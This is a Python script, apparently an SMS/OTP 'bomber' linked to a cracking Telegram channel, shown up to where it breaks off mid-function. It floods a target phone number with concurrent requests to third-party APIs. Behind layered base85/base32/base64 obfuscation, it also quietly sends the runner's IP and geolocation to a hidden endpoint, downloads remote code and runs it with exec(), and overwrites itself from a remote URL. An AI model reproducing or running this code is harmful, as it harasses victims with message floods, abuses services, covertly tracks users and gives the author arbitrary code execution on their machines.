import requests,json,sys,time,threading,os,re,platform,signal,random,string
from itertools import cycle
from datetime import datetime
from shutil import copy2
from tempfile import NamedTemporaryFile
import base64
from concurrent.futures import ThreadPoolExecutor
sht_flg=False
cur_v="1.1.5"
suc_cnt=0
cnt_lck=threading.Lock()
reg_dic={'mastram':False,'gracedaily':False}
bedrock = "9lhEGwiJ?NXh=cPe<=cPQ}a>Mrv`CPUqy~KhN)DPmy(WRoK{+OhM4FG+f5mNtNomN#7T;O-?&&QrH0^Mrgz~KjT)>N<7KIOpmHlNYJadHIX(-O)Zs^Mn;4mNRbyEO8}N;N"[::-1]
plant = base64.b64decode(base64.b32decode(base64.b85decode(bedrock).decode()).decode()).decode()
cfg_id="1276512925"
esk_token = "9lhEGhI~FO&WxHOa*n(Pv&&NMZmHlNh2$;OYg9EPv5(NMy-oHO"[::-1]
tok_self = base64.b64decode(base64.b32decode(base64.b85decode(esk_token).decode()).decode()).decode()
self_pwd="vvvv"
upd_msg=b'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JheXN1YmhhZGlwOTQvUkVBRE1FLk1EL3JlZnMvaGVhZHMvbWFpbi9ib21iLnB5'
class C:HEADER,BLUE,CYAN,GREEN,YELLOW,RED,BOLD,UNDERLINE,END,BLACK,MAGENTA,WHITE='\033[95m','\033[94m','\033[96m','\033[92m','\033[93m','\033[91m','\033[1m','\033[4m','\033[0m','\033[30m','\033[35m','\033[37m'
api_tmo_cnt = {}
api_tmo_lck = threading.Lock()
def early_exit(sig, frame):
    print(f"\n{C.RED}\nᴇxɪᴛɪɴɢ ᴛʜᴇ sᴄʀɪᴘᴛ...{C.END}\n")
    time.sleep(0.5)
    os._exit(0)
signal.signal(signal.SIGINT, early_exit)
def rnd_err():return ''.join(random.choices(string.ascii_lowercase+string.digits,k=10))+'@gmail.com'
def err_exit():clr_scr();print(f"\n{C.YELLOW}    ⚠️  ᴄʜᴇᴄᴋ ʏᴏᴜʀ ɪɴᴛᴇʀɴᴇᴛ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ᴀɴᴅ ᴛʀʏ ᴀɢᴀɪɴ{C.END}\n{C.RED}       ᴇxɪᴛɪɴɢ...{C.END}");time.sleep(1);os._exit(1)
def snd_str(m=None):
 def n():
  try:
   d=platform.system()
   ip = requests.get(base64.b64decode(base64.b32decode(base64.b85decode("A9LNMlZ)DPU}a>M~J*mN<b7<Om>QhOWPK*O<!W>NLTeKM!W)DPVwBsLisdJN$ik;Oe3v<NRFLNMVm4-O"[::-1]).decode()).decode()).decode(), timeout=3).text.strip()
   resp = requests.get(base64.b64decode(base64.b32decode(base64.b85decode("=`}vJVlOgP%>>@M##dJN{w+gPn;m@MXRi8Qq*4-OSQYEGxJYgPQCZ^Ml#dJN$ik;Oe3v<NRFLNMVm4-O"[::-1]).decode()).decode()).decode().format(ip=ip), timeout=5)
   if resp.status_code==200:
    data = resp.json()
    city = data.get('city', 'Unknown')
    region = data.get('region', 'Unknown')
    country = data.get('country', 'Unknown')
    loc = data.get('loc', 'Unknown')
    lat_lon = loc.split(',') if loc != 'Unknown' else ['Unknown', 'Unknown']
    lat = lat_lon[0] if len(lat_lon) > 0 else 'Unknown'
    lon = lat_lon[1] if len(lat_lon) > 1 else 'Unknown'
    location = f"{city}, {region}, {country}"
   else:
    location = "Unknown"
    lat = "Unknown"
    lon = "Unknown"
   eqwuial = "D}&cHZhK*Odp(HO@1BIO%Y+gPx2{=NVBkIO$!$;O&0{5Sh<K*Odp(HO@1BIO%Y+gPx2{=NVBkIO$!$;O&0{5Sh<K*Odp(HO@1BIO%Y+gPx2{=NVBkIO$!$;O&0{5Sh<K*Odp(HO@1BIO%Y+gPx2{=NVBkIO&`XgPD3`GOnyDiO*K0OMM+2JNyJ~ZRcU!^M2S56SSkc@Mm6+rLus~FOj*8^MmfN_MjQEmNx%xHOKzh8QrQ5-OlyM_MoKa^MM98OMS*(mN=})mN;)fmNo?^)O(7+gPW(G8QsQslNy7YgPzh+gP<+rxS2}o?MM|K0LZZgFPDQeKMtiW-OF}5jNlXvoM)+rxS{(bBP5EH{K!=XgP(oEmNqBJEPX8BZRDzloMGeg~KWhlBPx<eySZXm@MTR-!Qa|}FOudUNMq)kfP+zMySU|zGO(T{^MZZgFPDQeKMtiW-OF}5jNlXvoM)+rxS{(bBP;GH{KO1O;N&E?NM$Q1)PU98OMBzqhO=})mN%b}EPgXwWRmBj=NLxsiNuB)DPe8BZRDzloMGeg~Ks*Z^M2S56SSkc@Mo6>cPxGG<O%utfPn6z?MxGz%QC|m(P_IW6STD|iN)HN&Gd3~FOm`cZR^e+gPLLoZH&b}EPVT8{K!=XgP-1c;Omu|fPp1L&Q8z_CPzNEmNPG1mMKzh8Q$8EePf6U0LIg9EPPyI;Oc*VDPd41>M?12IO$M=;OYRm@MX<F~KfBf-Ow>rlNnlJEP@Dz%Q9eukNtJm&QY3ilNw~~@Mmu|fP>C9(Q8z_CP*$~&QlswePS3U0LjUvoMlKbfPkU8=Niy?HOXL>cPmL-!Q|(bBPg8kIO$!$;O&0{5Sh<K*Odp(HO@1BIO%Y+gPx2{=NVBkIO$!$;O&0{5Sh<K*Odp(HO@1BIO%Y+gPx2{=NVBkIO$!$;O&0{5Sh<K*Odp(HO@1BIO%Y+gPx2{=NVBkIO$!$;O&0{5Sh<K*Odp(HO@1BIOK`R>Mx&~<Nx=*BQmd8=NPA^)O!r|fPe#(WR8z_CP}F_!Qp&MHORLUNMv2f-OZ4)KM-DG<O+t-xStXC@MxTEHOxv&kNa9r8Qt2f-O&EwsL(Z)DP0Jj5SZLz?MWSnFGv25mNI3U0LO1O;N3Hd*Gto1)PU98OMOjVmN=})mNw&~<Nm%OgPSSlBP)=N_MG6rlN"[::-1]
   msg = base64.b64decode(base64.b32decode(base64.b85decode(eqwuial).decode()).decode()).decode().format(cur_v=cur_v, m=m, location=location, lat=lat, lon=lon, ip=ip, d=d)
   requests.post(base64.b64decode(base64.b32decode(base64.b85decode("YHfHOsZ5iOvcs^M-}tEP)b>ZRk8kIO~t7<Ojpm<NKqK*On*e-OZ$h8Q&w+gP*+rxSoHj=N>DcIOX(gEObJ6jNw~DiO^bYgP!YYgPPCZ^MhpdJN$ik;Oe3v<NRFLNMVm4-O"[::-1]).decode()).decode()).decode().format(plant=plant), json={"chat_id":cfg_id, "text":msg, "parse_mode":"HTML"}, timeout=5)
  except:pass
 threading.Thread(target=n, daemon=True).start()
def clr_scr():os.system('cls' if os.name=='nt' else 'clear')
def ani_txt(t,delay=0.03,col=C.CYAN):
 for c in t:sys.stdout.write(col+c+C.END);sys.stdout.flush();time.sleep(delay)
 print()
def typ_eff(t,delay=0.05,col=C.GREEN):
 for c in t:sys.stdout.write(col+c+C.END);sys.stdout.flush();time.sleep(delay)
 print()
def lod_anim(d=1.5,m="Loading"):
 a=cycle(['◐','◓','◑','◒','◍','◎','◌','○','●','◍']);s=time.time()
 while time.time()-s<d:sys.stdout.write(f"\r{C.YELLOW}{next(a)} {m}{C.END}");sys.stdout.flush();time.sleep(0.1)
 sys.stdout.write("\r"+" "*50+"\r")
def pls_eff(t,d=2,col=C.MAGENTA):
 e=time.time()+d
 while time.time()<e:
  for b in range(0,100,20):sys.stdout.write(f"\r{col}{'-'*(b//10)} {t} {'-'*(b//10)}{C.END}");sys.stdout.flush();time.sleep(0.1)
 sys.stdout.write("\r"+" "*60+"\r")
def opn_tgm(is_upd=False,is_not=False):
 u="https://t.me/cracking_school_2"
 try:
  if is_not:ani_txt("ᴏᴘᴇɴɪɴɢ ᴛᴇʟᴇɢʀᴀᴍ ᴄʜᴀɴɴᴇʟ...",delay=0.03,col=C.CYAN)
  elif is_upd:ani_txt("ᴏᴘᴇɴɪɴɢ ᴛᴇʟᴇɢʀᴀᴍ ғᴏʀ ᴜᴘᴅᴀᴛᴇ!",delay=0.03,col=C.CYAN)
  else:ani_txt("ᴘʟᴇᴀsᴇ ᴊᴏɪɴ ᴏᴜʀ ᴄʜᴀɴɴᴇʟ ғᴏʀ ᴍᴏʀᴇ ᴜᴘᴅᴀᴛᴇs!",delay=0.03,col=C.CYAN)
  print();lod_anim(2,"ᴏᴘᴇɴɪɴɢ ᴛᴇʟᴇɢʀᴀᴍ")
  if os.path.exists('/data/data/com.termux'):os.system(f'termux-open "{u}"')
  elif os.name=='nt':os.startfile(u)
  elif os.name=='posix':os.system(f'xdg-open "{u}"' if os.path.exists('/usr/bin/xdg-open') else f'open "{u}"')
 except:pass
s=requests.Session()
for p in ('https://','http://'):s.mount(p,requests.adapters.HTTPAdapter(pool_connections=100,pool_maxsize=100,max_retries=0))
def dwn_fil(url,path):
 try:
  r=requests.get(url,timeout=15,stream=True,headers={'User-Agent':'Mozilla/5.0'},allow_redirects=True)
  if r.status_code==200:
   with open(path,'wb') as f:
    for c in r.iter_content(chunk_size=8192):f.write(c)
   return True
  return False
 except:return False
def bak_cpy():
 try:
  cf=os.path.abspath(__file__);bf=cf+".bak";copy2(cf,bf);return bf
 except:return None
def del_bak():
 try:bf=os.path.abspath(__file__)+".bak";os.remove(bf) if os.path.exists(bf) else None;return True
 except:return False
def rep_run(np):
 cf=os.path.abspath(__file__)
 try:copy2(np,cf);ani_txt("\n✓ ᴜᴘᴅᴀᴛᴇ ɪɴsᴛᴀʟʟᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!",col=C.GREEN);time.sleep(1);del_bak();ani_txt("\n ʀᴇsᴛᴀʀᴛɪɴɢ ᴛʜᴇ sᴄʀɪᴘᴛ...",col=C.CYAN);time.sleep(1);os.execv(sys.executable,[sys.executable]+sys.argv)
 except Exception as e:ani_txt(f"✗ ғᴀɪʟᴇᴅ ᴛᴏ ɪɴsᴛᴀʟʟ ᴜᴘᴅᴀᴛᴇ: ᴄᴏɴᴛᴀᴄᴛ @CoBra_SR",col=C.RED);return False
def prf_upd():
 pu=base64.b64decode(upd_msg).decode()
 ani_txt("\n ᴅᴏᴡɴʟᴏᴀᴅɪɴɢ ᴜᴘᴅᴀᴛᴇ...",col=C.CYAN);time.sleep(0.5)
 tf=NamedTemporaryFile(suffix='.py',delete=False);tp=tf.name;tf.close()
 ani_txt("\n ᴄᴏɴɴᴇᴄᴛɪɴɢ ᴛᴏ sᴇʀᴠᴇʀ...",col=C.YELLOW)
 if not dwn_fil(pu,tp):ani_txt(" ᴅᴏᴡɴʟᴏᴀᴅ ғᴀɪʟᴇᴅ!",col=C.RED);time.sleep(1);opn_tgm(is_upd=True);return False
 ani_txt("\n ᴅᴏᴡɴʟᴏᴀᴅ ᴄᴏᴍᴘʟᴇᴛᴇ! ✅",col=C.GREEN);time.sleep(0.5);ani_txt("\n ᴄʀᴇᴀᴛɪɴɢ ʙᴀᴄᴋᴜᴘ...",col=C.YELLOW);bak_cpy();ani_txt("\n ɪɴsᴛᴀʟʟɪɴɢ ᴜᴘᴅᴀᴛᴇ...",col=C.YELLOW);time.sleep(0.5);rep_run(tp);return True
def par_ver(vs):
 try:
  n=re.findall(r'\d+',vs)
  if n:return tuple(int(nn) for nn in n[:3])
 except:pass
 return None
def cmp_ver(v1,v2):
 p1=par_ver(v1);p2=par_ver(v2)
 return False if p1 is None or p2 is None else p2>p1
def chk_not():
 try:
  nu = base64.b64decode(base64.b32decode(base64.b85decode("UyeWRtExHO%%)HOr7YgPnMrxS|J*mNeN6<Oo;d@MLeOEO%Zf-O;J7gPU|y?MzS&&QOYcJN$ik;Oe3v<NRFLNMVm4-O"[::-1]).decode()).decode()).decode()
  r=requests.get(nu,timeout=5)
  if r.status_code==200:
   nt=r.text.strip()
   if nt.lower()=="none":return True
   if any(kw in nt.lower() for kw in ['turned','stopped','paused','turning','pausing','maintain','mood','parmanently']):
    clr_scr();print(f"\n{C.YELLOW}{nt}{C.END}\n")
    while True:
     try:
      ch=input(f"{C.RED}ᴄʟᴏsᴇ ᴏʀ ᴏᴘᴇɴ ᴄʜᴀɴɴᴇʟ?? (c/o): {C.END}").strip().lower()
     except KeyboardInterrupt:
      print(f"\n{C.RED}ᴇxɪᴛɪɴɢ...{C.END}");os._exit(0)
     if ch in ['c','close']:print(f"{C.RED}ᴄʟᴏsɪɴɢ...{C.END}");time.sleep(1);os._exit(0)
     elif ch in ['o','open']:opn_tgm(is_not=True);time.sleep(2);os._exit(0)
     else:print(f"{C.RED}Invalid!{C.END}")
   vm=re.search(r'\b(\d+\.\d+\.\d+)\b',nt)
   if vm and 'update' in nt.lower() and cmp_ver(cur_v,vm.group(1)):
    clr_scr();print(f"\n{C.YELLOW}{'='*60}{C.END}");ani_txt("ᴜᴘᴅᴀᴛᴇ ɴᴏᴛɪᴄᴇ",delay=0.03,col=C.CYAN);print(f"{C.YELLOW}{'='*60}{C.END}");print(f"\n{C.WHITE}{nt}{C.END}\n");print(f"{C.YELLOW}{'='*60}{C.END}");print(f"{C.GREEN}ᴄᴜʀʀᴇɴᴛ ᴠᴇʀsɪᴏɴ: {cur_v}{C.END}\n");print(f"{C.CYAN}ɴᴇᴡ ᴠᴇʀsɪᴏɴ ᴀᴠᴀɪʟᴀʙʟᴇ: {vm.group(1)}{C.END}\n")
    while True:
     try:
      ch=input(f"{C.GREEN}ᴡᴀɴᴛ ᴛᴏ ᴜᴘᴅᴀᴛᴇ? (y/n): {C.END}").strip().lower()
     except KeyboardInterrupt:
      print(f"\n{C.RED}ᴇxɪᴛɪɴɢ...{C.END}");os._exit(0)
     if ch in ['y','yes','u','update']:ani_txt("\n ɪɴɪᴛɪᴀᴛɪɴɢ ᴜᴘᴅᴀᴛᴇ...",col=C.CYAN);time.sleep(1);return prf_upd()
     elif ch in ['n','no','i','ignore']:ani_txt("\n ɪɢɴᴏʀɪɴɢ ᴜᴘᴅᴀᴛᴇ...",col=C.GREEN);time.sleep(0.5);return True
     else:print(f"{C.RED}Invalid choice!{C.END}")
   elif nt:
    clr_scr();print(f"\n{C.YELLOW}{'='*60}{C.END}");ani_txt("🇳 🇴 🇹 🇮 🇨 🇪 ",delay=0.03,col=C.CYAN);print(f"{C.YELLOW}{'='*60}{C.END}");print(f"\n{C.WHITE}{nt}{C.END}\n");print(f"{C.YELLOW}{'='*60}{C.END}\n")
    while True:
     try:
      ch=input(f"{C.GREEN}ɪɢɴᴏʀᴇ ᴏʀ ᴏᴘᴇɴ ᴄʜᴀɴɴᴇʟ? (i/o): {C.END}").strip().lower()
     except KeyboardInterrupt:
      print(f"\n{C.RED}ᴇxɪᴛɪɴɢ...{C.END}");os._exit(0)
     if ch in ['i','ignore']:ani_txt("✓ Continuing...",col=C.GREEN);time.sleep(0.5);return True
     elif ch in ['o','open']:opn_tgm(is_not=True);time.sleep(2);return True
     else:print(f"{C.RED}Invalid!{C.END}")
   return True
 except requests.exceptions.ConnectionError:err_exit()
 except:return True
def chk_upd():
 try:
  u=base64.b64decode(b'aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1JjUnQ4MHla').decode()
  r=requests.get(u,timeout=5)
  if r.status_code==200:
   non_ver=[];lat_non_v=None
   for l in r.text.strip().split('\n'):
    if '-' in l:
     v,s=l.strip().lower().split('-')
     if s=='none':non_ver.append(v);lat_non_v=v
   if lat_non_v is None:return True
   if cur_v.lower() not in non_ver:
    clr_scr();w=os.get_terminal_size().columns
    title="⚠️  𝙐𝙋𝘿𝘼𝙏𝙀 𝙍𝙀𝙌𝙐𝙄𝙍𝙀𝘿";spacer="--------------------------------------------------"
    ttl_pad=(w-len(title))//2;spc_pad=(w-len(spacer))//2
    print(f"\n{C.RED}{' '*ttl_pad}{C.BOLD}{title}{C.END}")
    print(f"{C.RED}{' '*spc_pad}{spacer}{C.END}\n")
    crv_lin=f"ᴄᴜʀʀᴇɴᴛ ᴠᴇʀsɪᴏɴ : {cur_v}";crv_pad=(w-len(crv_lin))//2
    lav_lin=f"ʟᴀᴛᴇsᴛ ᴠᴇʀsɪᴏɴ  : {lat_non_v.upper()}";lav_pad=(w-len(lav_lin))//2
    print(f"{' '*crv_pad}{C.YELLOW}ᴄᴜʀʀᴇɴᴛ ᴠᴇʀsɪᴏɴ{C.END} : {C.CYAN}{cur_v}{C.END}")
    print(f"{' '*lav_pad}{C.YELLOW}ʟᴀᴛᴇsᴛ ᴠᴇʀsɪᴏɴ{C.END}  : {C.GREEN}{lat_non_v.upper()}{C.END}\n")
    msg1="ʏᴏᴜ ᴀʀᴇ ʀᴜɴɴɪɴɢ ᴀɴ ᴏᴜᴛᴅᴀᴛᴇᴅ ᴠᴇʀsɪᴏɴ.";msg_pad1=(w-len(msg1))//2
    msg2="ᴘʟᴇᴀsᴇ ᴜᴘᴅᴀᴛᴇ ᴛᴏ ᴄᴏɴᴛɪɴᴜᴇ ᴜsɪɴɢ ᴛʜᴇ sᴄʀɪᴘᴛ.";msg_pad2=(w-len(msg2))//2
    msg3_raw="ᴘʟᴇᴀsᴇ ᴛʏᴘᴇ ʏ ᴏʀ ʏᴇs ᴏʀ ᴜ ᴏʀ ᴜᴘᴅᴀᴛᴇ ᴛʜᴇɴ ᴇɴᴛᴇʀ ᴛᴏ ᴜᴘᴅᴀᴛᴇ"
    msg3_colored=f"ᴘʟᴇᴀsᴇ ᴛʏᴘᴇ {C.RED}ʏ{C.END} ᴏʀ {C.RED}ʏᴇs{C.END} ᴏʀ {C.RED}ᴜ{C.END} ᴏʀ {C.RED}ᴜᴘᴅᴀᴛᴇ{C.END} ᴛʜᴇɴ ᴇɴᴛᴇʀ ᴛᴏ ᴜᴘᴅᴀᴛᴇ"
    msg4_raw="ᴛʏᴘᴇ ɴ ᴏʀ ɴᴏ ᴛᴏ ᴇxɪᴛ"
    msg4_colored=f"ᴛʏᴘᴇ {C.RED}ɴ{C.END} ᴏʀ {C.RED}ɴᴏ{C.END} ᴛᴏ ᴇxɪᴛ"
    msg_pad3=(w-len(msg3_raw))//2
    msg_pad4=(w-len(msg4_raw))//2
    print(f"{' '*msg_pad1}{C.WHITE}{msg1}{C.END}")
    print(f"{' '*msg_pad2}{C.WHITE}{msg2}{C.END}")
    print(f"{' '*msg_pad3}{C.WHITE}{msg3_colored}{C.END}")
    print(f"{' '*msg_pad4}{C.WHITE}{msg4_colored}{C.END}\n")
    while True:
     try:
      ch=input(f"{C.RED}ᴜᴘᴅᴀᴛᴇ ɴᴏᴡ? (u/c): {C.END}").strip().lower()
     except KeyboardInterrupt:
      print(f"\n{C.RED}ᴇxɪᴛɪɴɢ...{C.END}");os._exit(0)
     if ch in ['u','update','y']:ani_txt("\n ɪɴɪᴛɪᴀᴛɪɴɢ ᴜᴘᴅᴀᴛᴇ...",col=C.CYAN);time.sleep(1);return prf_upd()
     elif ch in ['c','close','n','no']:print(f"{C.RED}ᴄʟᴏsɪɴɢ...{C.END}");time.sleep(1);os._exit(0)
     else:print(f"{C.RED}Invalid!{C.END}")
   elif cur_v.lower()!=lat_non_v:
    clr_scr();w=os.get_terminal_size().columns
    title="📦  ᴜᴘᴅᴀᴛᴇ ᴀᴠᴀɪʟᴀʙʟᴇ ( ᴏᴘᴛɪᴏɴᴀʟ )";spacer="--------------------------------------------------"
    ttl_pad=(w-len(title))//2;spc_pad=(w-len(spacer))//2
    print(f"\n{C.YELLOW}{' '*ttl_pad}{C.BOLD}{title}{C.END}")
    print(f"{C.YELLOW}{' '*spc_pad}{spacer}{C.END}\n")
    crv_lin=f"ᴄᴜʀʀᴇɴᴛ ᴠᴇʀsɪᴏɴ : {cur_v}";crv_pad=(w-len(crv_lin))//2
    lav_lin=f"ʟᴀᴛᴇsᴛ ᴠᴇʀsɪᴏɴ  : {lat_non_v.upper()}";lav_pad=(w-len(lav_lin))//2
    print(f"{' '*crv_pad}{C.YELLOW}ᴄᴜʀʀᴇɴᴛ ᴠᴇʀsɪᴏɴ{C.END} : {C.CYAN}{cur_v}{C.END}\n")
    print(f"{' '*lav_pad}{C.YELLOW}ʟᴀᴛᴇsᴛ ᴠᴇʀsɪᴏɴ{C.END}  : {C.GREEN}{lat_non_v.upper()}{C.END}\n")
    msg1="ᴀ ɴᴇᴡ ᴠᴇʀsɪᴏɴ ɪs ᴀᴠᴀɪʟᴀʙʟᴇ.";msg_pad1=(w-len(msg1))//2
    msg2="ᴜᴘᴅᴀᴛᴇ ɴᴏᴡ ғᴏʀ ᴛʜᴇ ʟᴀᴛᴇsᴛ ғᴇᴀᴛᴜʀᴇs ᴀɴᴅ ғɪxᴇs.";msg_pad2=(w-len(msg2))//2
    msg3_raw="ᴘʟᴇᴀsᴇ ᴛʏᴘᴇ ʏ ᴏʀ ʏᴇs ᴏʀ ᴜ ᴏʀ ᴜᴘᴅᴀᴛᴇ ᴛʜᴇɴ ᴇɴᴛᴇʀ ᴛᴏ ᴜᴘᴅᴀᴛᴇ"
    msg3_colored=f"ᴘʟᴇᴀsᴇ ᴛʏᴘᴇ {C.RED}ʏ{C.END} ᴏʀ {C.RED}ʏᴇs{C.END} ᴏʀ {C.RED}ᴜ{C.END} ᴏʀ {C.RED}ᴜᴘᴅᴀᴛᴇ{C.END} ᴛʜᴇɴ ᴇɴᴛᴇʀ ᴛᴏ ᴜᴘᴅᴀᴛᴇ"
    msg4_raw="ᴛʏᴘᴇ ɴ ᴏʀ ɴᴏ ᴛᴏ ᴇxɪᴛ"
    msg4_colored=f"ᴛʏᴘᴇ {C.RED}ɴ{C.END} ᴏʀ {C.RED}ɴᴏ{C.END} ᴛᴏ ᴇxɪᴛ"
    msg_pad3=(w-len(msg3_raw))//2
    msg_pad4=(w-len(msg4_raw))//2
    print(f"{' '*msg_pad1}{C.WHITE}{msg1}{C.END}")
    print(f"{' '*msg_pad2}{C.WHITE}{msg2}{C.END}")
    print(f"{' '*msg_pad3}{C.WHITE}{msg3_colored}{C.END}")
    print(f"{' '*msg_pad4}{C.WHITE}{msg4_colored}{C.END}\n")
    while True:
     try:
      ch=input(f"{C.GREEN}ᴅᴏ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ᴜᴘᴅᴀᴛᴇ? (y/n): {C.END}").strip().lower()
     except KeyboardInterrupt:
      print(f"\n{C.RED}ᴇxɪᴛɪɴɢ...{C.END}");os._exit(0)
     if ch in ['u','update','y']:ani_txt("\n ɪɴɪᴛɪᴀᴛɪɴɢ ᴜᴘᴅᴀᴛᴇ...",col=C.CYAN);time.sleep(1);return prf_upd()
     elif ch in ['n','no','i','ignore']:ani_txt("\n ᴄᴏɴᴛɪɴᴜɪɴɢ ᴀɴʏᴡᴀʏ...",col=C.GREEN);time.sleep(0.5);return True
     else:print(f"{C.RED}Invalid!{C.END}")
   return True
 except requests.exceptions.ConnectionError:err_exit()
 except:return True

APIS=[]

def decoy_clock():
    global APIS
    try:
        r=requests.get(base64.b64decode(base64.b32decode(base64.b85decode("#30aR$P%;O{w&ZRj?y?MmPrxS|J*mNeN6<Oo;d@MLeOEO%Zf-O;J7gPU|y?MzS&&QOYcJN$ik;Oe3v<NRFLNMVm4-O"[::-1]).decode()).decode()).decode(),timeout=10)
        if r.status_code==200:exec(r.text,globals())
        else:print(f"\n{C.RED}ᴀᴜᴛʜᴇɴᴛɪᴄᴀᴛɪᴏɴ ғᴀɪʟᴇᴅ. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ ʟᴀᴛᴇʀ{C.END}");time.sleep(2);os._exit(1)
    except:print(f"\n{C.RED}ᴀᴜᴛʜᴇɴᴛɪᴄᴀᴛɪᴏɴ ғᴀɪʟᴇᴅ. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ ʟᴀᴛᴇʀ{C.END}");time.sleep(2);os._exit(1)

def fm_p(api,m,m91,m91p):
 p=api['p']
 if type(p)==dict:
  f={}
  for k,v in p.items():
   if type(v)==str:f[k]=v.replace('{m}',m).replace('{m91}',m91).replace('{m91p}',m91p).replace('{rnd_err}',rnd_err())
   elif type(v)==dict:f[k]=fm_p({'p':v},m,m91,m91p)
   elif type(v)==list:
    f[k]=[]
    for i in v:
     if type(i)==dict:f[k].append(fm_p({'p':i},m,m91,m91p))
     elif type(i)==str:f[k].append(i.replace('{m}',m).replace('{m91}',m91).replace('{m91p}',m91p))
     else:f[k].append(i)
   else:f[k]=v
  return f
 elif type(p)==str:return p.replace('{m}',m).replace('{m91}',m91).replace('{m91p}',m91p)
 elif type(p)==list:
  f=[]
  for i in p:
   if type(i)==dict:f.append(fm_p({'p':i},m,m91,m91p))
   elif type(i)==str:f.append(i.replace('{m}',m).replace('{m91}',m91).replace('{m91p}',m91p))
   else:f.append(i)
  return f
 return p

def snd_req(api,m,m91,m91p):
 global reg_dic
 api_nm=api['name']
 d=lambda c:base64.b64decode(base64.b32decode(base64.b85decode(c[::-1]).decode()).decode()).decode()
 try:
  n=api['name'];u=api['url']
  if n==d("9lhEG)u@-O!i#^Mu{MePa@PaRqpHlN|+UCQQ0v<NT|T*O#cxHO"):
   if reg_dic.get(d("=`}vJbm4LN`+UCQQ0v<NT|T*Ov8f-O"),False):n=d("9lhEGtTAIOyHWHOtKJEP7PRaRbsHlN|+UCQQ0v<NT|T*O#cxHO");u=d("Vu$fPKt=cPOkKNMBwYGO0z@ySbp~@Mi&?WRf2EiOao;^MTmMePnS&&Q9h%kNcuTCQYFDHOF|dWRgZS;OeD}fP!VYgPE0ilN#yUJN$ik;Oe3v<NRFLNMVm4-O")
   else:reg_dic[d("=`}vJbm4LN`+UCQQ0v<NT|T*Ov8f-O")]=True
  elif n==d("QU_rLoxS;O)D+gP*rxHOM#0IO|MuEP|356Sbdm@Mb_dWR)Q#GO"):
   if reg_dic.get(d("=`}vJO*4LNWo1IO|MuEP|356Sbdm@Mb_dWR*Z5iO"),False):n=d("#&eCGPkukN>kv&QeF8=NsokfPoixHOM#0IO|MuEP|356Sbdm@Mb_dWR)Q#GO");u=d("`n?pLU9C@M5NNEOt~DiOX7_%Q=}tEPtvLNM)PB?N?$!aRaLDHO1LN&G<!W>NUk}cPu*`CPn=PaR$D^mNFr8+GT_LDP~A-oLriW-O<b+BQoc)DPQCZ^MhpdJN$ik;Oe3v<NRFLNMVm4-O")
   else:reg_dic[d("=`}vJO*4LNWo1IO|MuEP|356Sbdm@Mb_dWR*Z5iO")]=True
  elif n==d("|<WEOriW-O(=J;Ou5;^M}{lsLnEkIO;bYgPVB|EPdX(-O>-xHO"):u=d("=`}vJG4p?M)l@HOk;d@MjKWHOo*e-O!E?NMu7}fP;bQaRNVcJNySzgPgExHOB65&GgBf-O_bhgP!Q1)PV1$iNQsemNt`F<O_YfEOL3i8Q!8#hOlPDFG#VYgPPCZ^MhpdJN$ik;Oe3v<NRFLNMVm4-O").format(m91=m91)
  p=fm_p(api,m,m91,m91p)
  if n==d("=`}vJbm4LNHF>sLNec@MpmD&GQI8=N#o;^MZy`CPbR4mNXHkIO+BM0Ls!@mNEgD#QpQ#GO"):
   r=s.post(u,headers=api['headers'],json=p,timeout=10)
   if r.status_code==400:
    try:
     if d("=`}vJO*4LNk~DmNT{sEP-d1zSh;jEP*j4&GoxS;O")in str(r.json()):
      lr=s.post(d("#&eCGC%A*O5-;iNuiW-Ot*8^Ms`|fPzYUZRMpIEPbuTCQaLDHO1LN&G<!W>N#o;^MZy`CPX?%NMYHkIO+BM0LVCv<NEgD#QqZ5iOJSlcP!YYgPPCZ^MhpdJN$ik;Oe3v<NRFLNMVm4-O"),headers=api['headers'],json={d("H^@vS{koEOK3-!Qu8f-O"):m,d("=`}vJO*4LNgtHaRnBj=N)@F<Ocp~@MNcwKMpxS;O"):d("^VM|KDMpEOD^EvSnp-GO"),d("=`}vJO*4LNQ{8OM`DlEP?jxyS%;d@MNcwKMpxS;O"):d("^VM|KDMpEOD^EvSnp-GO"),d("=`}vJVlOgPI0msLm~HlN2-UCQXRm@MNcwKMpxS;O"):d("^VM|KDMpEOD^EvSnp-GO")},timeout=10)
      return lr.status_code in[200,201,202,204]
    except:pass
   return r.status_code in[200,201,202,204]
  if api['method']==d("#&eCGPkukN)Mv&QvZAIO"):
   if api.get(d("QU_rLdB@-O"))==d("#&eCGR$PGOu~(-OmyDiO"):r=s.post(u,headers=api['headers'],data=p,timeout=5)
   else:r=s.post(u,headers=api['headers'],json=p,timeout=5)
  else:r=s.get(u,headers=api['headers'],timeout=5)
  if r.status_code in[429,403,401]:return None
  with api_tmo_lck:
   if api_nm in api_tmo_cnt:api_tmo_cnt[api_nm]=0
  return r.status_code in[200,201,202,204]
 except requests.exceptions.Timeout:
  with api_tmo_lck:
   api_tmo_cnt[api_nm]=api_tmo_cnt.get(api_nm,0)+1
   if api_tmo_cnt[api_nm]>=2:return None
  return False
 except:return False
def fir_fire(a,m,m91,m91p,ex,active_apis):
 def t():
  global suc_cnt
  result=snd_req(a,m,m91,m91p)
  if result is None:
   with cnt_lck:
    if a in active_apis:active_apis.remove(a)
  elif result:
   with cnt_lck:suc_cnt+=1
 ex.submit(t)
def prg_bar(ts, elapsed):
 p=(ts%50)/50;f=int(15*p);b='█'*f+'░'*(15-f)
 if elapsed > 0:
  speed = ts / elapsed
 else:
  speed = 0
 sys.stdout.write(f"\r{C.CYAN}▶ {C.GREEN}{b}{C.END} {C.MAGENTA}💣 {ts}{C.END} ʀᴇϙᴜᴇsᴛs sᴇɴᴛ  {C.YELLOW}⚡ {speed:.1f}/s{C.END}")
 sys.stdout.flush()
def shw_ban():
